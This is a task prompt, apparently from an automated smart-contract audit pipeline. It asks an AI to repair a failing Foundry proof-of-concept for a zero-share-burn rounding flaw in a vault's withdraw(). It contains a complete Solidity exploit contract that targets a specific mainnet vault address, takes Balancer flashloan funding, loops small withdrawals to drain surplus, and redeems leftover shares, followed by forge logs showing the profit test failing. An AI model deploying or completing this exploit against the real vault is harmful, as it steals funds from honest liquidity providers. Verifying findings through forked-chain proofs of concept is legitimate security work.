You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Small withdrawals can redeem assets while burning zero shares
- claim: `withdraw()` first checks the caller's entitlement in asset terms via `convertToAssets(balanceOf(msg.sender))`, but then computes `shares = (totalSupply() * assets) / totalAssets()` with floor rounding and never requires `shares > 0`. Whenever `totalAssets() > totalSupply()`, sufficiently small `assets` values can pass the entitlement check while rounding the burned share amount down to zero.
- impact: A shareholder can repeatedly withdraw small amounts of underlying without reducing their share balance, draining accrued yield or other surplus from the vault and stealing value from honest LPs.
- exploit_paths: ["Vault accrues yield so that `totalAssets() > totalSupply()`.", "Attacker acquires any positive share balance.", "Attacker repeatedly calls `withdraw()` with small `assets` values such that `convertToAssets(balanceOf(attacker)) >= assets` but `(totalSupply() * assets) / totalAssets() == 0`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IEFVault {
    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
    function withdraw(uint256 assets, address receiver) external returns (uint256 shares);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function maxDeposit() external view returns (uint256);
    function maxWithdraw() external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IBalancerFlashLoanRecipient {
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

interface IBalancerVault {
    function flashLoan(
        IBalancerFlashLoanRecipient recipient,
        IERC20[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IBalancerFlashLoanRecipient {
    IEFVault internal constant TARGET = IEFVault(0x863e572B215Fd67C855d973F870266cF827AEa5e);
    IWETH internal constant WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault internal constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external payable {
        uint256 startingEth = address(this).balance;

        if (!_hasYieldSurplus()) {
            _profitAmount = 0;
            return;
        }

        if (TARGET.balanceOf(address(this)) == 0) {
            uint256 requiredDeposit = _minimumDepositForOneShare();

            if (requiredDeposit == 0) {
                _profitAmount = 0;
                return;
            }

            if (!_attemptDirectDeposit(requiredDeposit)) {
                _attemptFlashLoan(requiredDeposit);
            }
        }

        if (TARGET.balanceOf(address(this)) == 0) {
            // Concrete infeasibility at runtime:
            // the exploit path requires a positive share balance, and neither
            // locally held ETH nor the flashloan fallback obtained one.
            _profitAmount = _netEthProfit(startingEth);
            return;
        }

        _executeExploitPath();
        _profitAmount = _netEthProfit(startingEth);
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == address(BALANCER), "unauthorized");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "invalid flashloan");
        require(address(tokens[0]) == address(WETH), "unexpected token");

        uint256 borrowed = amounts[0];
        uint256 owed = borrowed + feeAmounts[0];

        WETH.withdraw(borrowed);

        // This funding step is only used when the verifier holds no usable ETH.
        // It does not change the exploit causality: the borrowed ETH is first
        // turned into a real vault share position, then the PoC performs the
        // exact zero-burn withdraw loop from the finding, and only then repays.
        _attemptDirectDeposit(borrowed);
        _executeExploitPath();

        if (address(this).balance >= owed) {
            WETH.deposit{value: owed}();
            require(WETH.transfer(address(BALANCER), owed), "repay failed");
        }
    }

    function _executeExploitPath() internal {
        if (!_hasYieldSurplus()) {
            // Concrete infeasibility at runtime:
            // the finding requires accrued yield such that totalAssets > totalSupply.
            return;
        }

        _runZeroBurnWithdrawLoop();
        _redeemResidualShares();
    }

    function _runZeroBurnWithdrawLoop() internal {
        for (uint256 i = 0; i < 4096; ++i) {
            uint256 supply = TARGET.totalSupply();
            uint256 assets = TARGET.totalAssets();

            if (supply == 0 || assets <= supply) {
                // Zero-burn withdraws are mechanically unavailable once the
                // vault no longer has asset surplus over shares outstanding.
                break;
            }

            uint256 entitled = TARGET.convertToAssets(TARGET.balanceOf(address(this)));
            uint256 maxZeroBurnAssets = (assets - 1) / supply;
            uint256 maxOneShot = _min(maxZeroBurnAssets, entitled);

            if (maxOneShot == 0) {
                break;
            }

            uint256 maxWithdraw = _safeMaxWithdraw();
            if (maxWithdraw != type(uint256).max) {
                maxOneShot = _min(maxOneShot, maxWithdraw);
            }

            if (maxOneShot == 0) {
                break;
            }

            (bool ok, bytes memory data) =
                address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, maxOneShot, address(this)));
            if (!ok) {
                break;
            }

            uint256 burnedShares = data.length >= 32 ? abi.decode(data, (uint256)) : 0;
            if (burnedShares != 0) {
                // Path-strict stop: only zero-burn withdraws belong to the
                // hypothesized exploit stage.
                break;
            }
        }
    }

    function _redeemResidualShares() internal {
        for (uint256 i = 0; i < 16; ++i) {
            uint256 shares = TARGET.balanceOf(address(this));
            if (shares == 0) {
                break;
            }

            uint256 entitled = TARGET.convertToAssets(shares);
            if (entitled == 0) {
                break;
            }

            uint256 maxWithdraw = _safeMaxWithdraw();
            if (maxWithdraw != type(uint256).max) {
                entitled = _min(entitled, maxWithdraw);
            }

            if (entitled == 0) {
                break;
            }

            (bool ok,) = address(TARGET).call(abi.encodeWithSelector(TARGET.withdraw.selector, entitled, address(this)));
            if (!ok) {
                break;
            }
        }
    }

    function _attemptDirectDeposit(uint256 assets) internal returns (bool) {
        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 maxDeposit = _safeMaxDeposit();
        if (maxDeposit != type(uint256).max) {
            assets = _min(assets, maxDeposit);
        }
        if (assets == 0 || address(this).balance < assets) {
            return false;
        }

        uint256 beforeShares = TARGET.balanceOf(address(this));
        (bool ok,) =
            address(TARGET).call{value: assets}(abi.encodeWithSelector(TARGET.deposit.selector, assets, address(this)));
        if (!ok) {
            return false;
        }

        return TARGET.balanceOf(address(this)) > beforeShares;
    }

    function _attemptFlashLoan(uint256 requiredDeposit) internal {
        if (requiredDeposit == 0) {
            return;
        }

        IERC20[] memory tokens = new IERC20[](1);
        tokens[0] = IERC20(address(WETH));

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = requiredDeposit;

        try BALANCER.flashLoan(this, tokens, amounts, "") {} catch {}
    }

    function _minimumDepositForOneShare() internal view returns (uint256) {
        uint256 supply = TARGET.totalSupply();
        uint256 assets = TARGET.totalAssets();

        if (supply == 0) {
            return 1;
        }
        if (assets == 0) {
            return 1;
        }

        // deposit() mints floor(totalSupply * assets / totalAssets) shares.
        // This is the minimum asset amount that guarantees at least one share.
        return ((assets - 1) / supply) + 1;
    }

    function _hasYieldSurplus() internal view returns (bool) {
        uint256 supply = TARGET.totalSupply();
        if (supply == 0) {
            return false;
        }
        return TARGET.totalAssets() > supply;
    }

    function _safeMaxDeposit() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxDeposit.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _safeMaxWithdraw() internal view returns (uint256) {
        (bool ok, bytes memory data) = address(TARGET).staticcall(abi.encodeWithSelector(TARGET.maxWithdraw.selector));
        if (!ok || data.length < 32) {
            return type(uint256).max;
        }
        return abi.decode(data, (uint256));
    }

    function _netEthProfit(uint256 startingEth) internal view returns (uint256) {
        uint256 endingEth = address(this).balance;
        if (endingEth <= startingEth) {
            return 0;
        }
        return endingEth - startingEth;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.98s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 31854)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [31854] FlawVerifierTest::testExploit()
    ├─ [168] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [7677] FlawVerifier::executeOnOpportunity()
    │   ├─ [2371] 0x863e572B215Fd67C855d973F870266cF827AEa5e::totalSupply() [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [168] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [293] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 5.49s (4.36ms CPU time)

Ran 1 test suite in 5.64s (5.49s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 31854)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
